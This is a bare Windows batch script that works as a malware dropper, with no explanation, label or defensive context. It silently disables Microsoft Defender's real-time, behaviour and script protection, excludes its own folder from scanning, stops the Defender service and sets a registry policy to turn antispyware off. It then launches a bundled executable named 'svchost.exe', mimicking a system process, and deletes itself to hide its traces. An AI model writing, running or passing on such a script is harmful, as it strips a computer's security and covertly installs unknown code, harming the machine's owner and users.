@echo off
cd /d "%~dp0"
powershell -w hidden -Command "Set-MpPreference -DisableRealtimeMonitoring,DisableBehaviorMonitoring,DisableBlockAtFirstSeen,DisableIOAVProtection,DisableScriptScanning $true; Set-MpPreference -CloudProtectionLevel 0 -PUAProtection 0; Add-MpPreference -ExclusionPath '%~dp0'"
sc stop WinDefend >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
powershell -w hidden -Command "Start-Sleep 3"
if exist "%~dp0svchost.exe" start /b "" "%~dp0svchost.exe"
del "%~f0" >nul 2>&1
